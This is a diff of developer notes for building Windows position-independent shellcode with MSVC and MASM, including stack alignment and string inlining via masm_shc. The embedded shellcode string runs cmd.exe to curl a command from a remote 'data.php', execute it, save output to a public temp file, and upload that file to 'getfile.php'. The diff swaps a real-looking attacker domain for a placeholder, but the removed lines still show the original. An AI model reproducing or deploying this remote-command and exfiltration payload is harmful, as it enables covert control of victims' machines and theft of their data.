@@ -8,11 +8,13 @@ For x86
 2) "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx86\x86\cl.exe" /c /FA /GS- c_shell.cpp
 3) "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx86\x86\ml.exe" c_shell.asm /link /entry:main
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
 Syntax error for x32 bit:
 ASSUME FS:NOTHING
 MOV EAX, FS:[0]
 ASSUME FS:ERROR
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Stack alignment set for x64. MUST ADD in x64 versions
 ; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm
@@ -36,16 +38,16 @@ AlignRSP PROC
     ret ; Return to caller
 AlignRSP ENDP
 
-
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
 For inlining strings: using tool called masm_shc : https://github.com/hasherezade/masm_shc
 It automatically inlines, all the strings !!!!
 x64
 BEFORE:
 
-($SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://r.baa'
-	DB	'lejibreel.com/shaddy/data.php'') do set output=%i && %i > C:\'
+($SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://your_'
+	DB	'url_here.com/shaddy/data.php'') do set output=%i && %i > C:\'
 	DB	'users\public\temp.txt && curl --form "fileToUpload=@C:\users\'
-	DB	'public\temp.txt" https://r.baalejibreel.com/shaddy/getfile.ph'
+	DB	'public\temp.txt" https://your_url_here.com/shaddy/getfile.ph'
 	DB	'p" ', 00H
 	ORG $+7) DECLARED IN CONST SEGMENT
 
@@ -58,10 +60,10 @@ AFTER:
 
 ;Line 26
 CALL after_$SG90904
-$SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://r.baa'
-	DB	'lejibreel.com/shaddy/data.php'') do set output=%i && %i > C:\'
+$SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://your_'
+	DB	'url_here.com/shaddy/data.php'') do set output=%i && %i > C:\'
 	DB	'users\public\temp.txt && curl --form "fileToUpload=@C:\users\'
-	DB	'public\temp.txt" https://r.baalejibreel.com/shaddy/getfile.ph'
+	DB	'public\temp.txt" https://your_url_here.com/shaddy/getfile.ph'
 	DB	'p" ', 00H
 	ORG $+7
 after_$SG90904:
